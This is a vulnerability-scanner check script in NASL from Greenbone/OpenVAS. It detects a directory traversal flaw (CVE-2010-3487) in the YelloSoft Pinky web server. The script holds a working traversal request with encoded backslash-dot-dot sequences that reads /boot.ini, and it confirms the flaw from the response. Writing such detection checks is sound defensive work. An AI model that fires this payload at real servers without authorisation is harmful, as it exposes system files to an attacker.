# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902253");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2010-09-29 09:26:02 +0200 (Wed, 29 Sep 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-3487");
  script_name("YelloSoft Pinky Directory Traversal Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/41538");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1009-exploits/pinky10-traversal.txt");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/Pinky.1.0.Directory.Traversal/42");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 2323);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to gain information
about directory and file locations.");
  script_tag(name:"affected", value:"Yellosoft pinky version 1.0 and prior on windows.");
  script_tag(name:"insight", value:"Input passed via the URL is not properly verified before being
 used to read files. This can be exploited to download arbitrary files via
directory traversal attacks.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"YelloSoft Pinky is prone to a directory traversal vulnerability.");
  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port( default:2323 );

res = http_get_cache(item:string("/index.html"), port:port);

if("<title>Pinky</title" >< res && ">YelloSoft<" >< res)
{
  request = http_get(item:"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C.." +
                          "/%5C../%5C../boot.ini", port:port);
  response = http_keepalive_send_recv(port:port, data:request);

  if(("\WINDOWS" >< response) && ("boot loader" >< response)){
      security_message(port);
  }
}
